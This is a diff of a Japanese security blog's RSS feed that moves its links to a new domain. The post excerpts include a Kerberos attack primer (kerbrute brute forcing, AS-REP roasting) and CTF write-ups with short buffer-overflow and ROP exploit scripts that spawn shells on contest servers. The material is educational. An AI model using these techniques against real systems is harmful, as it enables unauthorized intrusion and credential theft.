@@ -2,21 +2,21 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>$ make life</title>
-    <link>https://alicemacs.com/</link>
+    <link>https://owlinux1000.github.io/blog/</link>
     <description>Recent content on $ make life</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>ja</language>
     <lastBuildDate>Sat, 29 Feb 2020 10:17:51 +0900</lastBuildDate>
     
-	<atom:link href="https://alicemacs.com/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://owlinux1000.github.io/blog/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Kerberos への攻撃手法</title>
-      <link>https://alicemacs.com/blog/krb5_attacks_101/</link>
+      <link>https://owlinux1000.github.io/blog/blog/krb5_attacks_101/</link>
       <pubDate>Sat, 29 Feb 2020 10:17:51 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/krb5_attacks_101/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/krb5_attacks_101/</guid>
       <description>目次 はじめに 本記事では、前記事(Kerberos 入門)で学んだKerberosの基本的な概念や動作を知っていることを前提にKerberosへの攻撃手法について解説します。ここで紹介している内容は、自分で管理している端末外では決して行わないでください。
 Brute Force Attack for Kerberos Kerberosにおいてもブルートフォース攻撃は有効です。Kerberosへのブルートフォース攻撃を行うために必要な条件は基本的には1つです。それは、KDCへの接続ができるという条件だけです。さらにKerberosの認証のレスポンスで、パスワードが間違っている場合、ユーザ名が正しいかどうかを教えてくれます。つまり、存在するユーザかどうかの判断を行うことができます。しかしながら、試行回数などによりブロックしたりすることも可能なので、本攻撃を行う際には注意が必要です。
 ブルートフォースを行うツールとしては、kerbruteが便利です。ユーザ名とパスワードを記載したファイル、ドメインを指定することでブルートフォース攻撃が行えます。
@@ -29,10 +29,10 @@ kali@kali:~/bin/impacket/examples$ python GetNPUsers.py dc01.alicemacs.local/sni
     
     <item>
       <title>Kerberos 入門</title>
-      <link>https://alicemacs.com/blog/krb5_101/</link>
+      <link>https://owlinux1000.github.io/blog/blog/krb5_101/</link>
       <pubDate>Mon, 24 Feb 2020 17:36:24 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/krb5_101/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/krb5_101/</guid>
       <description>はじめに 本記事では、基本的なKerberosの概念や動作概要について紹介します。次回執筆予定のKerberosに対するペネトレーションテストの記事を理解するために必要な知識をまとめています。Kerberosは一見複雑そうに見えるプロトコルですが、Kerberos用語などを理解すると動作内容がとても明快でシンプルなことがわかります。そこで、まずは知らない用語も含まれてきてしまうかもしれませんが、基本用語を始めに記載しました。まずは、ここに目を通していただいてから、動作概要を見ていただくのが良いかと思います。筆者自身もKerberosについて深い理解があるわけではなく勉強がてらまとめているので間違いなどありましたら、Twitterなどでご指摘いただけると幸いです。
 Kerberosとは Kerberosは、パスワードがネットワーク上を流れる箇所を減らし、代わりにチケットと呼ばれる暗号化されたデータを用いて、各種サービスを利用する仕組みを提供するプロトコルです。Kerberosには、大きく分けて3つのバージョンの括りが存在します。バージョン1,2,3はテストの目的で作られMITの内部でのみ使われていました。MITが最初に外部に配布したのがバージョン4です。しかしながら、バージョン4ではDES暗号を使っており、当時のアメリカ合衆国政府が課した暗号化ソフトウェアに対する輸出規制のためアメリカ合衆国以外へ輸出することができませんでした（そのため、MITの開発チームは、Kerberosからすべての暗号化コードを抜いた輸出可能なBonesというソフトウェアを構築しました）。そして、現在主流となるのがバージョン5です。バージョン4では提供されなかった機能の追加やセキュリティの強化を目的として開発されました。今日ではKerberosは、MicrosoftのActive Directoryなどにも採用されており企業ネットワークでは非常に重要な存在になっています。
 基本用語  レルム(REALM)  Kerberosにおける管理対象となる論理的なネットワーク レルム名には、**DNSのドメイン名(大文字)**が利用されることが多い  例) ALICEMACS.COM     プリンシパル(PRINCIPAL)  Kerberosから認識されるユーザ、サービスやホストのこと  ユーザプリンシパル、サービスプリンシパル(SPN)、ホストプリンシパルの3つに大別される   プリンシパル名と呼ばれる一意な名前を利用する([]内はオプション項目)  username[/instance]@REALM (instanceは、ホスト名) service[/FQDN]@REALM (ホストプリンシパルの場合、serviceが&amp;quot;host&amp;quot;という固定文字列になる)     サービスサーバ(SS: Service Server)  Kerberos対応したサービスを提供するサーバ   サービスチケット(ST: Service Ticket)  サービスの利用するためにクライアントがサービスサーバに送信するチケット   チケット交付チケット(TGT: Ticket Granting Ticket)  サービスチケットを要求するために利用されるチケット   認証サーバ(AS: Authentication Server)  クライアントに、暗号化されたTGTを発行する この暗号化には、クライアントのパスワードが利用されるため本人でないと復号できない   チケット交付サーバ(TGS: Ticket Granting Server)  サービスチケットをクライアントに発行する   鍵配布センター(KDC: Key Distribution Center)  以下の3つの要素から構成される  すべてのプリンシパルと関連する暗号化鍵のデータベース 認証サーバ チケット交付サーバ   1つのレルムには少なくとも1つの鍵配布センターが必要    動作概要 ここでは、例としてあるユーザがクライアントからKerberos対応したサービスを利用するまでの流れを見ていきます。初めに以降に説明する流れを簡単に図示したものを示します。適宜、この図を見返しながら読むとわかりやすいかもしれません。</description>
@@ -40,10 +40,10 @@ Kerberosとは Kerberosは、パスワードがネットワーク上を流れる
     
     <item>
       <title>令和元年のうちに抑えておくLinuxマルウェアの基本</title>
-      <link>https://alicemacs.com/blog/linux_malware101/</link>
+      <link>https://owlinux1000.github.io/blog/blog/linux_malware101/</link>
       <pubDate>Sat, 28 Dec 2019 15:00:00 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/linux_malware101/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/linux_malware101/</guid>
       <description>はじめに 本記事では、私の頭の中に断片的に蓄積されているLinuxマルウェアに関する知見を年末の大掃除がてら整理してみる。おそらく一般的なことが多いと思う。浅く広くという感じで紹介していく。だいたいの本はWindowsマルウェアについてしか書かれていないが、Mastering Malware Analysisにはこの手のことが纏まっていたので学びたい人は読むと良い。
 1. 感染経路 ここでは、Linuxマルウェアに感染する主な経路について紹介する。この手のLinuxマルウェアやIoTマルウェアの多くは、弱いデフォルトパスワード などを狙う場合が多い。典型的なのは、admin:adminやroot:rootなどだ。その他、プロトコルスタック周りの脆弱性を突かれることによるケースも多く存在する。これによりいったんLinuxシステムに侵入されるとLinuxマルウェアは、次の永続化機構などで足場を固める行動に移る。
 2. 永続化機構 ここではLinuxマルウェアが利用する代表的な永続化機構について紹介する。WindowsのCurrenVersion\Runキー等への書き込みと同様に永続化するための機構を備えている場合が多い。もしLinuxマルウェアに感染している際は以下に記載したようなファイルやディレクトリ群を調査するのが良い。
@@ -58,10 +58,10 @@ $ ls -la (which passwd) -rwsr-xr-x 1 root root 59640 Mar 23 2019 /usr/bin/passwd
     
     <item>
       <title>GitHub Action を使ってみる</title>
-      <link>https://alicemacs.com/blog/playground_with_github_action/</link>
+      <link>https://owlinux1000.github.io/blog/blog/playground_with_github_action/</link>
       <pubDate>Sat, 07 Dec 2019 18:47:45 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/playground_with_github_action/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/playground_with_github_action/</guid>
       <description>はじめに リリースされてからまだGitHub Actionを使っていなかったので、勉強がてら触ってみた。その際に学んだことをまとめておく。
 GitHub Action とは GitHub Actionは、簡単に言ってしまえばGitHubで使える標準のCI/CDのようなツールだ。独自のワークフローを定義することで、GitHub上の様々なイベントでそれを発火させることができる。設定方法は簡単で、repository/.github/workflows/[ファイル名].yml にTravisのようなYMLファイルを作成するだけ。
 使ってみる 今回試してみたのは、このブログの内容をGitHubにpushしたら、自動的に自分のVPSへデプロイするようなCDとしての機能の実現のために利用してみた。対象リポジトリは以下である。
@@ -71,10 +71,10 @@ name: Deploy my website to the server on: push: branches: - master jobs: build: 
     
     <item>
       <title>Powershell学習サイトUnder The Wireの問題を解く</title>
-      <link>https://alicemacs.com/blog/powershell_ctf_utw/</link>
+      <link>https://owlinux1000.github.io/blog/blog/powershell_ctf_utw/</link>
       <pubDate>Mon, 02 Dec 2019 23:00:00 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/powershell_ctf_utw/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/powershell_ctf_utw/</guid>
       <description>はじめに 本記事は、彌冨研 Advent Calendar 2019 の3日目の記事です。ちなみに2018年に彌冨研究室を卒業しました。卒業研究は、One-dimensional convolutional neural networks for Android malware detection でした。
 みなさんは、Powershellはお好きですか？僕は嫌いでした。主にWindowsでしか使わない点やよくわからない構文など勉強したいと思う意欲すら浮かびませんでした。しかしながら、セキュリティ界隈だと特にペネトレーションテストなどでは、Windows に標準的に導入されているPowershellは非常に有効なツールです。またマルウェアなどもPowershellを使うケースが非常に多いためセキュリティ業界ではPowershellの理解は必須となるツールの1つです。そこで重い腰を上げて勉強しようとした際にとあるサイトを見つけました。それがUnder The Wire です。このサイトは、CTF形式でPowershellについて学ぶことができるサイトです。本記事では、それの最初のレベルであるCenturyの解き方を紹介していきます。このサイトで提示されている環境へSSHでログインするとPowershellのプロンプトが表示されます。次の問題に進むためには、最初の問題を解く必要があり、その問題の答えが次の問題へのSSHパスワードになっています。
 Century0（事前準備）  Slackのチームに参加して、指定されているチャンネルにログインすると、username:password を得ることができる  Century1 問題概要  当該システムのビルドバージョンを求める  解法  PSVersionTable という変数に様々なバージョン情報が格納されている 下記結果より、答えは10.0.14393.3053  PS C:\Users\century1\documents&amp;gt; $PSVersionTable Name Value ---- ----- PSVersion 5.1.14393.3053 PSEdition Desktop PSCompatibleVersions {1.0, 2.0, 3.0, 4.0...} BuildVersion 10.0.14393.3053 CLRVersion 4.0.30319.42000 WSManStackVersion 3.0 PSRemotingProtocolVersion 2.3 SerializationVersion 1.1.0.1 Century2 問題概要  PowerShellでwgetのような挙動をするコマンドレット名（小文字）にデスクトップ上にあるファイルのファイル名を連結したものを求めよ  解法  Invoke-WebRequest がwgetのような動きをするコマンドレット デスクトップに移動すると443というファイル名のファイルが存在する 答えは、invoke-webrequest443  Century3 問題概要  デスクトップ上にあるファイル数を求めよ  解法  Get-ChildItem で対象ディレクトリの中身の一覧を取得 Where-Object を使ってファイルのみを抽出  $_ が、パイプラインで渡されたオブジェクトを示す PSIsContainer は、ディレクトリの場合Trueを返す   Measure でパイプラインで渡されたオブジェクトの数をカウント 答えは、123  PS C:\Users\century3\documents&amp;gt; Get-ChildItem .</description>
@@ -82,10 +82,10 @@ Century0（事前準備）  Slackのチームに参加して、指定されて�
     
     <item>
       <title>GIAC Exploit Researcher and Advanced Penetration Tester (GXPN) 合格体験記</title>
-      <link>https://alicemacs.com/blog/passed_gxpn/</link>
+      <link>https://owlinux1000.github.io/blog/blog/passed_gxpn/</link>
       <pubDate>Fri, 01 Nov 2019 21:15:46 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/passed_gxpn/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/passed_gxpn/</guid>
       <description>tl; dr  GIAC Exploit Researcher and Advanced Penetration Tester (GXPN) に85% で合格した 勉強方法  受講したトレーニングのテキストを読み込むのと、演習をすべてやり直す 模擬試験を本番と同様の状況で受ける（紙の辞書やテキストを用意して） 実技テスト対策に、模擬試験では環境に慣れておく    はじめに GIAC Reverse Engineering Malware（GREM）合格体験記 を書いてから約半年で2つ目のGIAC資格を取得することができた。前回は初めてのGIAC 試験だったのでたくさん文章を書いたが今回は簡単に勉強方法と感想だけ書いておこうと思う。
 GXPNは、SANS 660 Advanced Penetration Testing, Exploit Writing, and Ethical Hacking に対応するGIAC資格で、主にペネトレーションテスト に関する分野の問題が出題される。前回同様、トレーニング自体も受講したのでテキストや模擬試験x2を受けることができた。どんな問題が出題されるかは、公式サイトを見てほしい。
 勉強方法 前回のGREMの記事で書いた事とまったく同じ感じの勉強を行った。しかしながら、GXPNでは実技テストが存在するため、具体的な中身については言えないが、トレーニングでやった演習などを通じて、「こういうことをやりたい場合、どのツールを使って、どうすればいいか」などがパッと浮かぶレベルには仕上げた（つもりだったがいくつかわからずもどかしかった）。また実技テストの環境が若干癖があるので、模擬試験を通してなれておくことをおすすめする。
@@ -95,10 +95,10 @@ GXPNは、SANS 660 Advanced Penetration Testing, Exploit Writing, and Ethical Ha
     
     <item>
       <title>CSAW CTF 2014 Greenhornd writeup</title>
-      <link>https://alicemacs.com/blog/greenhornd_writeup/</link>
+      <link>https://owlinux1000.github.io/blog/blog/greenhornd_writeup/</link>
       <pubDate>Thu, 19 Sep 2019 23:49:38 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/greenhornd_writeup/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/greenhornd_writeup/</guid>
       <description>はじめに 本記事では、CSAW CTF 2014 で出題されたWindows 環境のPwnable 問題「greenhornd」を解説する。CTF におけるWindows のPwnable 問題が割合がかなり少なく知見もあまりまとまっていない分野なので自分の学習がてらまとめてみた。Linux でのPwnに慣れている人向けの記述になっているので、うまく補完しながら読んでほしい。
 1. 環境準備 1.1 Windows OS の準備 Linux と異なり環境構築に戸惑う人もいると思うので準備方法を記載していく。Windows OS自体は、Edgeのテスト用として用意されている、Free Virtual Machines from IE8 to MS Edge - Microsoft Edge Development を用いる。本ページにアクセスしたら、「Virtual machine」の欄を「IE11 on Win81 (x86)」に選択、「Select platform」を「VirtualBox」にして、ダウンロードボタンをクリックする。ダウンロードが完了したらzipを展開し、仮想マシンをインポートする。
 1.2 解析環境の準備 本VMは、ドライブが備わっていないので、VirtualBoxの設定からドライブを作成して、Guest Addition をインストールする。インストール後は、共有フォルダあるいはD&amp;amp;Dやクリップボードの共有ができるようにしてホストマシンと相互にやりとりできるようにしておく。また、ホストマシンと本VMにpingが届くことも確認しておく(Windows はpingをデフォルトで応答しないので、VM側からホストマシン側へ飛ばすと良い。) 最後に、検証やポートの公開などで面倒なので、Windows Firewall を無効にしておく。
@@ -108,28 +108,28 @@ GXPNは、SANS 660 Advanced Penetration Testing, Exploit Writing, and Ethical Ha
     
     <item>
       <title>Csaw2019 writeup</title>
-      <link>https://alicemacs.com/blog/csaw2019/</link>
+      <link>https://owlinux1000.github.io/blog/blog/csaw2019/</link>
       <pubDate>Mon, 16 Sep 2019 09:50:28 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/csaw2019/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/csaw2019/</guid>
       <description>Misc mcgriddlev2  問題文にFLAGが記載されている flag{W3lcome_7o_CSAW_QUALS_2019!}  Pwn baby_boi (50pt)  シンプルなBOFでIPが奪える問題 libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う  #!/usr/bin/env ruby # coding: ascii-8bit require &amp;#39;pwn&amp;#39; $z = Sock.new &amp;#34;localhost&amp;#34;, 8888 $z = Sock.new &amp;#34;pwn.chal.csaw.io&amp;#34;, 1005 libc = ELF.new &amp;#34;./libc-2.27.so&amp;#34; #libc = ELF.new &amp;#34;/lib/x86_64-linux-gnu/libc-2.29.so&amp;#34; def z; $z; end z.recvuntil(&amp;#34;\n&amp;#34;) libc_printf = z.recvuntil(&amp;#34;\n&amp;#34;).match(/: (.+)/)[1].to_i(16) libc_base = libc_printf - libc.symbols[&amp;#34;printf&amp;#34;] puts &amp;#34;%x&amp;#34; % libc_base payload = &amp;#34;A&amp;#34; * 40 payload &amp;lt;&amp;lt; p64(libc_base + 0x4f322) z.sendline(payload) z.interact  flag{baby_boi_dodooo_doo_doo_dooo}  GOT Milk?</description>
     </item>
     
     <item>
       <title>HarekazeCTF 2019 writeup</title>
-      <link>https://alicemacs.com/blog/harekazectf2019/</link>
+      <link>https://owlinux1000.github.io/blog/blog/harekazectf2019/</link>
       <pubDate>Sun, 19 May 2019 16:54:53 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/harekazectf2019/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/harekazectf2019/</guid>
       <description>Baby ROP 1  バイナリ中で、system 関数使ってechoしており、Canary等もないBOFが起こるので、pop rdi; ret 使ってsystem(/bin/sh) を呼ぶだけ  #!/usr/bin/env ruby require &amp;#39;pwn&amp;#39; context.log_level = :debug z = Sock.new &amp;#34;problem.harekaze.com&amp;#34;, 20001 pop_rdi_ret = p64(0x00400683) system = p64(0x4005e3) STDIN.gets z.recvuntil &amp;#34;? &amp;#34; payload = &amp;#34;A&amp;#34; * 24 payload &amp;lt;&amp;lt; pop_rdi_ret payload &amp;lt;&amp;lt; p64(0x601048) payload &amp;lt;&amp;lt; system z.sendline payload z.interact  HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}  Baby ROP 2  system 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ  #!/usr/bin/env ruby require &amp;#39;pwn&amp;#39; context.log_level = :debug z = Sock.</description>
     </item>
     
     <item>
       <title>Terraform でConoha のインスタンスを立ててみる</title>
-      <link>https://alicemacs.com/blog/terraform_for_conoha/</link>
+      <link>https://owlinux1000.github.io/blog/blog/terraform_for_conoha/</link>
       <pubDate>Sat, 18 May 2019 12:24:26 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/terraform_for_conoha/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/terraform_for_conoha/</guid>
       <description>はじめに 最近(?)、自分の中で触ってみたかった技術の1つにTerraformがある。そこで今回は、Terraform でConoha のインスタンスを立ててみる。自分の中での理解をまとめているので間違いあれば教えてください。
 Terraform とは Terraform は、Vagrant などで有名なHashiCorp が開発しているツールで、クラウドサービスやOpenStack を対象に、独自の定義ファイルを用いてインスタンスの管理（構築・削除）を行うことができる。定義ファイルには、HCL を用いて主にtf ファイルに記載していく。私の第一印象としては、Ruby のDSL のような雰囲気を感じるが、Vagrantfile ほどRuby 感はない。どちらかというとjson などに近い雰囲気だ。
 Terraform のインストール 今回は、MacBook Proで行っているので、brew 経由でインストールする。
@@ -143,10 +143,10 @@ resource &amp;quot;openstack_compute_keypair_v2&amp;quot; &amp;quot;keypair&amp;
     
     <item>
       <title>GIAC Reverse Engineering Malware（GREM）合格体験記</title>
-      <link>https://alicemacs.com/blog/passed_grem/</link>
+      <link>https://owlinux1000.github.io/blog/blog/passed_grem/</link>
       <pubDate>Fri, 03 May 2019 14:32:45 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/passed_grem/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/passed_grem/</guid>
       <description>tl;dr  GIAC Reverse Engineering Malware（GREM） に 81.33% で合格した 勉強方法  受講したトレーニングのテキストを読み込むのと、演習をすべてやり直す 模擬試験を本番と同様の状況で受ける（紙の辞書やテキストを用意して） 少しでも詰まった概念などについては、ググって知識を補完した   トレーニング以外の総合計勉強時間は30 ~ 40時間ほど 試験言語は、英語だが英語自体の難易度は高くない  よっぽど英語に自信がない限りは、保険のために紙の辞書を持っていくと良い    はじめに 今回GREMと呼ばれるGIACのマルウェア解析系の資格試験を受けてきて、見事81.33%で合格することができた。この資格については、あまり情報を公開できないのだが、触れられる範囲で勉強法など当日までの道のりをメモしておく。私自身、初めてGIACの試験を受けたのだが、あまり事前情報がない(日本国内の)ため、今後受ける人の参考になると嬉しい。
 はじめに、この手の話は筆者のスペックを語っておいた方が勉強時間や勉強方法などの参考になると思うので少し触れておく。私は、CTFを通して主にELFファイルの解析等を3年ほどやっているため、普通のx86やamd64のバイナリ(逆アセンブル結果)なら苦じゃなく読むことはできる。しかしながら、PEバイナリなどWindows環境やWin32 API、今流行りのマルウェアやキャンペーンなどについては、ド素人である。マルウェアがどういうレジストリキーを書き込むとか、どんなファイルを作成するとかその手の話題も正直あまり詳しくない。そこで、私は2019年3月にSANS For 610というコースに参加してきた。そのため、何もトレーニングを受けてない人に比べるとかなり優位ではある。このコースでは、主に前述した内容などを学んできた。そのため、当初に比べるとかなりスキルは上がったような気はする。また、英語スキル的には、英語で書かれたドキュメントや技術洋書は苦じゃなく読むことができるが、ちょこちょこ英単語ググりながら読んでるレベルである。正直得意ではない。以上がざっとしたスペックである。
 勉強方法 トレーニングを受講してから、およそ4ヵ月以内に本試験を受けなければならない。社会人2年目になった私は、あまり勉強時間が取れないと思い、このGWに勉強しようと決めてGWに突入した。当初の予定では、このGWに勉強して、受験期限日のギリギリに試験を受ける予定だった。
@@ -162,10 +162,10 @@ GIACの試験では、トレーニングテキストを持ち込むことがで�
     
     <item>
       <title>平成のうちに理解しておくYara 入門</title>
-      <link>https://alicemacs.com/blog/yara/</link>
+      <link>https://owlinux1000.github.io/blog/blog/yara/</link>
       <pubDate>Mon, 29 Apr 2019 07:03:53 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/yara/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/yara/</guid>
       <description>&amp;ldquo;平成も終わるし、知ったかぶりしてる技術を令和に持ち越さないようにしような&amp;rdquo;
  目次  Yara とは はじめてのYara ルール 文字列を用いたYara ルール 正規表現を用いたYara ルール 複数条件を用いたYara ルール Yara の便利機能 モジュール機能を用いたYara ルール Pythonから利用するYara ルール まとめ  Yara とは Yaraは、「Yara ルール」と呼ばれる専用のルールを用いて、マルウェアや悪意あるファイルなどを検知することのできるツールです。Yara ルールでは、文字列による検査や正規表現、論理条件などをサポートしており複雑なルールを構築することもできます。利用例として、あるマルウェアファミリーの特徴をYara ルールとして作成しておくことで、新しいマルウェアが発見されたときに既知のマルウェアファミリーに性質が近いかどうかなどを検知することができます。Yara は、Cuckoo Sandboxなど他のセキュリテイツールと連携していることが多く、セキュリテイに関わる人間としては、一度読み書きしておいた方が良いツールの１つです。本記事では、Yara を使ったこと無い人向けに基本的な概念やルールを幅広くご紹介します。
 まずは、Yara を利用するためにインストールしましょう。Ubuntu では、aptからインストールすることができます。
@@ -180,28 +180,28 @@ $ yara hello_rule.</description>
     
     <item>
       <title>Angstrom2019 writeup</title>
-      <link>https://alicemacs.com/blog/angstrom2019/</link>
+      <link>https://owlinux1000.github.io/blog/blog/angstrom2019/</link>
       <pubDate>Thu, 25 Apr 2019 21:57:22 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/angstrom2019/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/angstrom2019/</guid>
       <description>Misc IRC  freenodeに入るとFLAG actf{like_discord_but_worse}  The mueller Report  PDFが渡されるので、とりあえずactfでgrepするとFLAG actf{no0o0o0_col1l1l1luuuusiioooon}  Blank PDF  PDFが渡されるが開けず、fileコマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG actf{knot_very_interesting}  Paper Trail  pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している actf{fake_math_papers}  Scratch It Out  project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される 最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる 地味に面白い actf{Th5_0pT1maL_LANgUaG3}  Web Control you  HTMLソースを見てFLAG actf{control_u_so_we_can&amp;rsquo;t_control_you}  Crypto Classy Cipher  ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く actf{so_charming}  encrypted = &amp;#39;:&amp;lt;M?TLH8&amp;lt;A:KFBG@V&amp;#39; for i in range(0xff): for c in encrypted: print(chr((ord(c)-i) % 0xff), end=&amp;#39;&amp;#39;) Really Secure Algorithm  RSAのパラメータがe, p, q, cが渡されるので復号するだけ actf{really_securent_algorithm}  require_relative &amp;#39;.</description>
     </item>
     
     <item>
       <title>VolgaCTF 2019 writeup</title>
-      <link>https://alicemacs.com/blog/volga2019/</link>
+      <link>https://owlinux1000.github.io/blog/blog/volga2019/</link>
       <pubDate>Wed, 03 Apr 2019 08:07:43 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/volga2019/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/volga2019/</guid>
       <description>Shadow cat  /etc/shadowとencrypted.txtが渡される /etc/shadowには、1文字のユーザ名とその暗号化されたパスワードなどが乗っており、encrypted.txtにはその1文字で構成される文字列が含まれており、単一替え字暗号だとわかる /etc/shadowのパスワードを総当たりで解き、得れた替え字表を使って置換するコードを書いて実行したらFLAG  #!/usr/bin/env ruby require &amp;#39;unix_crypt&amp;#39; # gem install unix-crypt org = [] ans = [] lines = File.read(&amp;#34;./shadow.txt&amp;#34;).split(&amp;#34;\n&amp;#34;) lines.each do |line| org &amp;lt;&amp;lt; line.split(&amp;#34;:&amp;#34;)[0] enc = line.split(&amp;#34;:&amp;#34;)[1] salt = line.split(&amp;#34;$&amp;#34;)[2] 0x1f.upto(0x7e) do |i| hashpass = UnixCrypt::SHA512.build(i.chr, salt) if hashpass == enc ans &amp;lt;&amp;lt; i.chr puts &amp;#34;Passed&amp;#34; break end end end encrypted = File.read(&amp;#34;./encrypted.txt&amp;#34;).chomp puts &amp;#34;VolgaCTF{#{encrypted.tr(org.join(&amp;#34;&amp;#34;), ans.join(&amp;#34;&amp;#34;))}}&amp;#34;  VolgaCTF{pass_hash_cracking_hashcat_always_lurks_in_the_shadows}  </description>
     </item>
     
     <item>
       <title>線形合同法で生成される乱数値を予測する</title>
-      <link>https://alicemacs.com/blog/predict_lcg/</link>
+      <link>https://owlinux1000.github.io/blog/blog/predict_lcg/</link>
       <pubDate>Mon, 01 Apr 2019 22:33:26 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/predict_lcg/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/predict_lcg/</guid>
       <description>はじめに 線形合同法（LCG）とは、至極一般的かつ簡易に実装することができる乱数生成手法の1つです。先日行われたVolgaCTF 2019では、この線形合同法により生成される乱数値を予測する問題（問題名LG）が出題されました。本問題ではx0 ~ x6に相当する6つの乱数が表示され、それを元に次の値を算出する問題です。
 線形合同法 線形合同法は、以下の式で定義されます。
 x1 = (a * x0 + c) % p このとき、x0は乱数のseed値、a, c, pがパラメータとなり適切な値を選びます。今回の問題では、x0 ~ x6までの値が与えられ、その次の値を入力するといったものでした。「a, c, pがわからないと無理じゃない？ｗ」と思ってしまったのですが、どうやら行列演算することで「a, c, p」を算出可能らしいです。
@@ -211,28 +211,28 @@ x1 = (a * x0 + c) % p このとき、x0は乱数のseed値、a, c, pがパラメ
     
     <item>
       <title>PragyanCTF 2019 writeup</title>
-      <link>https://alicemacs.com/blog/pragyan2019/</link>
+      <link>https://owlinux1000.github.io/blog/blog/pragyan2019/</link>
       <pubDate>Sun, 10 Mar 2019 22:48:37 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/pragyan2019/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/pragyan2019/</guid>
       <description>Welcome  JPEGが渡されるが、binwalkをかけると中にzipがあるので取り出す 取り出したzipを展開すると壊れたbmpとパスワード付きのzipが展開される bmpファイルの末尾にはbase64エンコードされたような文字列があるのでデコードするとzipのパスワード zipを展開するとpngファイルがでてくる stegosolveで適当にぽちぽちやるとFLAG pctf{st3gs0lv3_1s_u53ful}  Cookie Monster  Cookieにflagというフィールドがあり、MD5が設定されている どこかのMD5クラックサイトで検索するとpcがでてくる フラグフォーマットは、pctf{なのでひたすらこのCookieのMD5の元を考えれば良いとわかる pctf{c0oki3s_@re_yUm_bUt_tHEy_@ls0_r3vEaL_@_l0t}  Feed_me  バイナリを読むと、渡された乱数3つがチェック用の値になっている 入力文字列を10byteずつ分割してatoiに流し込んでいて、以下の式が成り立てばおｋなので、あとは算数  x + y = a1 y + z = a2 x + z = a3  自分が解いたときのケース  Can you cook my favourite food using these ingredients :) -10026 ; -8250 ; -12490 ; -000007133-000002893-000005357 That&#39;s yummy.... Here is your gift: pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3} Game of Faces  ページにアクセスすると3色のよくわからん正方形があるが、ソースを見るとファイルアップロードが見える 適当にファイルをアップロードするとh1タグでbase64エンコードされた文字列が帰ってくるのでデコードするとファイル名がわかる ファイル名で直接アクセスするとフラグ pctf{You_L00K_Wi3Rd_IN_H3R3}  Easy RSA  e, c, nのパラメータが渡されるが、eが著しく大きいので、Wiener&amp;rsquo;s Attackだとわかる コード書いて、秘密鍵dを計算すると12978409760901509356642421072925801006324287746872153539187221529835976408177だとわかる あとは普通にRSAを解読したら、出てきた数値を16進数表記にして1byteずつasciiにすればフラグ pctf{Sup3r_st4nd4rd_W31n3r_4tt4ck}  Late PR  課題を提出しようとしてたけどパソコンがクラッシュしたという問題文とともにイメージファイルが渡される vol.</description>
     </item>
     
     <item>
       <title>BesidesCTF 2019 writeup</title>
-      <link>https://alicemacs.com/blog/bsidessf2019/</link>
+      <link>https://owlinux1000.github.io/blog/blog/bsidessf2019/</link>
       <pubDate>Sun, 10 Mar 2019 22:43:52 +0900</pubDate>
       
-      <guid>https://alicemacs.com/blog/bsidessf2019/</guid>
+      <guid>https://owlinux1000.github.io/blog/blog/bsidessf2019/</guid>
       <description>blink  apkが渡されるのでunzipして、classes.dexをdex2jarでjarファイルに変換 jarファイルをunzipして、classファイルをjadで一括逆コンパイル 適当にファイルを眺めていると/com/example/blink/r2d2.jadにbase64でエンコードされた文字列があるのでデコード CTF{PUCKMAN}と書かれた画像が出てくる  zippy  pcapngが渡されるのでFollo TCP Streamをするとsupercomplexpasswordがzipのパスワードだとわかる パケットからzipファイルを通信してるパケットを見つけて抽出 パスワードを使ってunzipすると中のflag.txtにCTF{this_flag_is_your_flag}  futurella  HTMLのソースを見るとCTF{bring_it_back}  kookie  cookie/monsterでログインできるのでログインする その際のCookieを見ると、cookieになっているので、これをadminに変更 その後reloadするとCTF{kookie_cookies}  </description>
     </item>
     
     <item>
